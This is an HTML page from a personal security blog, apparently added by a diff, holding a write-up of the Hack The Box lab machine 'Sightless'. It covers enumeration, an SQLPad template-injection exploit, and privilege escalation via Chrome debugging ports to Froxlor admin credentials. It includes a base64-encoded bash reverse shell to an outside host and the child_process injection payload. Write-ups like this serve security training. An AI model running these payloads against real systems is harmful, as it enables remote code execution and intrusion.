@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Sightless - Flavien Jaquerod</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="A short writeup of the easy linux `HTB` machine: `Sightless`. Really fun machine as the privilege escalation part required inspecting a `Chrome` session.">
+		<meta property="og:url" content="http://localhost:1313/posts/sightless/">
+  <meta property="og:site_name" content="Flavien Jaquerod">
+  <meta property="og:title" content="Sightless">
+  <meta property="og:description" content="A short writeup of the easy linux `HTB` machine: `Sightless`. Really fun machine as the privilege escalation part required inspecting a `Chrome` session.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-02-14T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-02-14T00:00:00+00:00">
+    <meta property="article:tag" content="Box">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Machine">
+    <meta property="article:tag" content="Chrome">
+
+		
+  <meta itemprop="name" content="Sightless">
+  <meta itemprop="description" content="A short writeup of the easy linux `HTB` machine: `Sightless`. Really fun machine as the privilege escalation part required inspecting a `Chrome` session.">
+  <meta itemprop="datePublished" content="2024-02-14T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-02-14T00:00:00+00:00">
+  <meta itemprop="wordCount" content="901">
+  <meta itemprop="keywords" content="Box,CTF,HTB,Easy,Machine,Chrome,FTP">
+		
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Sightless">
+  <meta name="twitter:description" content="A short writeup of the easy linux `HTB` machine: `Sightless`. Really fun machine as the privilege escalation part required inspecting a `Chrome` session.">
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/custom.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="A bunch of cybersecurity stuff" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/Icon.webp">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">A bunch of cybersecurity stuff</div>
+					<div class="logo__tagline">ZeroDay Chronicles</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/">
+				
+				<span class="menu__text">About</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/">
+				
+				<span class="menu__text">Posts</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/news/">
+				
+				<span class="menu__text">News</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/cheatsheets/">
+				
+				<span class="menu__text">Cheat Sheets</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Sightless</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 16 16"><path d="M8 1c2 0 3.5 2 3.5 4.5S10 9 10 9c3 1 4 2 4 6H2c0-4 1-5 4-6 0 0-1.5-1-1.5-3.5S6 1 8 1"/></svg><span class="meta__text">Flavien Jaquerod</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2024-02-14T00:00:00Z">2024-02-14</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/box/" rel="category">Box</a>, <a class="meta__link" href="/categories/machine/" rel="category">Machine</a>, <a class="meta__link" href="/categories/writeup/" rel="category">Writeup</a>, <a class="meta__link" href="/categories/easy/" rel="category">Easy</a>
+	</span>
+</div></div>
+		</header>
+		
+<div class="post__toc toc">
+	<div class="toc__title">Page content</div>
+	<div class="toc__menu">
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#port-21">Port 21</a></li>
+        <li><a href="#port-80">Port 80</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+	</div>
+</div><div class="content post__content clearfix">
+			<h2 id="enumeration">Enumeration</h2>
+<p>As always we can start with an <code>nmap</code> scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     syn-ack
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines: 
+</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">220</span> ProFTPD Server <span style="color:#f92672">(</span>sightless.htb FTP Server<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>::ffff:10.129.170.105<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>|     Invalid command: try being more creative
+</span></span><span style="display:flex;"><span>|_    Invalid command: try being more creative
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://sightless.htb/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port21-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>9/7%Time<span style="color:#f92672">=</span>66DCA36E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Ge
+</span></span><span style="display:flex;"><span>SF:nericLines,A3,<span style="color:#e6db74">&#34;220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20S
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:erver\)\x20\[::ffff:10\.129\.170\.105\]\r\n500\x20Invalid\x20command:\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20being\x20more\x20creative\r\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>The nmap scan shows us many ports open including</p>
+<ul>
+<li>21 running ftp</li>
+<li>22 running ssh</li>
+<li>80 running http</li>
+</ul>
+<p>We can then explore ports 21 and 80 to see if we discover something interesting</p>
+<h3 id="port-21">Port 21</h3>
+<p>We can try an anonymous login but it doesn&rsquo;t work</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp anonymous@10.129.170.105                                                                                          
+</span></span><span style="display:flex;"><span>Connected to 10.129.170.105.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> ProFTPD Server <span style="color:#f92672">(</span>sightless.htb FTP Server<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>::ffff:10.129.170.105<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">550</span> SSL/TLS required on the control channel
+</span></span><span style="display:flex;"><span>ftp: Login failed
+</span></span></code></pre></div><h3 id="port-80">Port 80</h3>
+<p>Going over to <code>sightless.htb</code> we see a website and we can try to enumerate it further using <code>gobuster</code>and <code>dirsearch</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster vhost -w /usr/share/SecLists/Discovery/DNS/namelist.txt  -u http://sightless.htb --append-domain                                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>                                                                                              
+</span></span><span style="display:flex;"><span>Gobuster v3.6                                                                                                                                                
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>                                                                                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>                                                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:             http://sightless.htb                                                                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:          GET                                                                                                                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:         <span style="color:#ae81ff">10</span>                                                                                                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:        /usr/share/SecLists/Discovery/DNS/namelist.txt                                                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:      gobuster/3.6                                                                                                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:         10s                                                                                                                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Append Domain:   true                                                                                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in VHOST enumeration mode                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>Clicking on the buttons at the bottom we discover a new subdomain: <code>sqlpad.sightless.htb</code>
+&ndash;&gt; we can add it to our hosts file and visit it ==&gt; we are met by a database schema where we might be able to run commands</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirsearch -u http://sqlpad.sightless.htb                                                                                                                 
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest
+</span></span><span style="display:flex;"><span>/pkg_resources.html                                                                                                                                          
+</span></span><span style="display:flex;"><span>  from pkg_resources import DistributionNotFound, VersionConflict                                                                                            
+</span></span><span style="display:flex;"><span>                                                                                                                                                             
+</span></span><span style="display:flex;"><span>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                             
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>                                                                                                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                                                             
+</span></span><span style="display:flex;"><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style="color:#ae81ff">25</span> | Wordlist size: <span style="color:#ae81ff">11460</span>                                                                 
+</span></span><span style="display:flex;"><span>                                                                                                                                                             
+</span></span><span style="display:flex;"><span>Output File: /home/flavien/Desktop/HTB CTFs/Machines/Sightless/reports/http_sqlpad.sightless.htb/_24-09-07_21-11-14.txt                                      
+</span></span><span style="display:flex;"><span>                                                                                                                                                             
+</span></span><span style="display:flex;"><span>Target: http://sqlpad.sightless.htb/                                                                                                                         
+</span></span><span style="display:flex;"><span>                                                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:14<span style="color:#f92672">]</span> Starting:                                                                                                                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api/                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api/2/explore/                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api/_swagger_/                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api/api                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api/__swagger__/                                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api/2/issue/createmeta                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api/apidocs/swagger.json 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api/application.wadl
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:32<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   21B  - /api/vendor/phpunit/phpunit/phpunit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:33<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  179B  - /assets  -&gt;  /assets/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:46<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   10KB - /favicon.ico  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:11:56<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  297B  - /manifest.json
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Task Completed
+</span></span></code></pre></div><p>We see that we can create an access and a connection on the dashboard to connect to an <code>sql</code>database</p>
+<p><img src="Sightless_access.png" alt="image"></p>
+<p>We see 2 users: <code>john@sightless.htb &amp; admin@sightless.htb</code></p>
+<p>==&gt; After looking around for a bit we discover <a href="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb">this command injection</a> that we can try</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>We can follow what is said in the blog above to gain a remote shell, first we can create our docker container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo docker run -p 3000:3000 --name sqlpad -d --env SQLPAD_ADMIN<span style="color:#f92672">=</span>admin --env SQLPAD_ADMIN_PASSWORD<span style="color:#f92672">=</span>admin sqlpad/sqlpad:latest
+</span></span><span style="display:flex;"><span>0e721809c73d06b128e9693c6510ca171ea194249b545e0b55bab9eb70d7d125
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo docker ps                                                                                                               
+</span></span><span style="display:flex;"><span>CONTAINER ID   IMAGE                  COMMAND                CREATED         STATUS        PORTS                                       NAMES
+</span></span><span style="display:flex;"><span>0e721809c73d   sqlpad/sqlpad:latest   <span style="color:#e6db74">&#34;/docker-entrypoint&#34;</span>   <span style="color:#ae81ff">2</span> seconds ago   Up <span style="color:#ae81ff">1</span> second   0.0.0.0:3000-&gt;3000/tcp, :::3000-&gt;3000/tcp   sqlpad
+</span></span></code></pre></div><p>Then we need to connect to it using the dashboard:</p>
+<p><img src="Sightless_co.png" alt="image"></p>
+<p>And finally we can verify if we have a working shell using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo docker exec -it sqlpad cat /tmp/pwn
+</span></span></code></pre></div><p>Where we see that we have successfully executed commands on the server &ndash;&gt; we can now use a bash payload to try and get a reverse shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODcvNDQ0NCAwPiYx | base64 -d | bash
+</span></span></code></pre></div><p>and we can create a new connection with the database field to get a reverse shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{{</span> process.mainModule.require<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;child_process&#39;</span><span style="color:#f92672">)</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODcvNDQ0NCAwPiYx | base64 -d | bash&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">}}</span>
+</span></span></code></pre></div><p>and this gives us a reverse shell</p>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>Checking out what services are running on the local ports, we discover a <code>Froxlor</code>instance running on port 8080 that we can verify using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 127.0.0.1:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;title&gt;Froxlor&lt;/title&gt;
+</span></span></code></pre></div><p>and we also notice a few other ports</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netstat -ltnp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
+</span></span><span style="display:flex;"><span> will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:44727         0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:40671         0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:37883         0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::21                   :::*                    LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -
+</span></span></code></pre></div><p>We can then port forward all of the 40*** ports and inspect them using <code>Chrome</code>,</p>
+<p><img src="Sightless_chrome.png" alt="image"></p>
+<p>once that done we can inspect the connection and we get the credentials for the <code>admin.sightless.htb:8080</code>website</p>
+<p><img src="Sightless_admin.png" alt="image"></p>
+<p>And we have the creds: <strong>admin - ForlorfroxAdmin</strong> as well as a url <code>admin.sightless.htb:8080/admin_logger.php?page=log</code></p>
+<p>We finally can login to this website with these credentials on <code>http://127.0.0.1:8080/index.php</code> and we can then use the php configuration stuff to copy the root flag and then make it readable</p>
+<p><img src="Sightless_root.png" alt="image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /root/root.txt /tmp/root.txt
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">644</span> /tmp/root.txt
+</span></span></code></pre></div><p>and after logging out and in again we can read the flag</p>
+
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/box/" rel="tag">Box</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/ctf/" rel="tag">CTF</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/htb/" rel="tag">HTB</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/easy/" rel="tag">Easy</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/machine/" rel="tag">Machine</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/chrome/" rel="tag">Chrome</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/ftp/" rel="tag">fTP</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Flavien Jaquerod avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Flavien Jaquerod</span>
+	</div>
+	<div class="authorbox__description">
+		Currently studying a cybersecurity Master&rsquo;s degree at EPFL and ETHZ. Also solving CTF challenges or HTB Machines in my free time!
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/builder/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Builder</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/onetwoseven/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">OneTwoSeven</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2025 Flavien Jaquerod.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+<script src="/js/custom.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
